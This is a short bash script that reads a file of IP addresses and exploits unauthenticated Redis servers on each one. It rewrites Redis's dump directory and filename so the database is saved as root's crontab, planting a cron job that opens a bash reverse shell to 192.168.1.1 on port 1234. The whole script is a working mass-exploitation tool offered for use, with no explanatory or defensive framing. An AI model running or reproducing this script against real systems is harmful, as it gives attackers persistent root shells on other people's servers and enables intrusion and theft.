#!/bin/bash
getshell(){
echo "-----分割线-----"
redis-cli -h $i  2>&1 <<eeooff
config get dir
config set dir /var/spool/cron
set x "\n* * * * * bash -i >& /dev/tcp/192.168.1.1/1234 0>&1\n"   
config set dbfilename root
save
exit
eeooff
echo done!
}

ip=$IFSa
if [ $# -ne 1 ];then
       echo "Usage $0 filename"
       exit
fi
if [ ! -f $1 ];then
        echo " $1 is not a file"
        exit
fi
if [ -f log.txt ];then
        echo "log.txt existing"
        `rm -f log.txt`
fi
IFS=$'\n'
for i in `cat $1`
        do
                echo $i

                getshell >>log.txt
                #sleep 3s  

                echo $i >> log.txt
        done
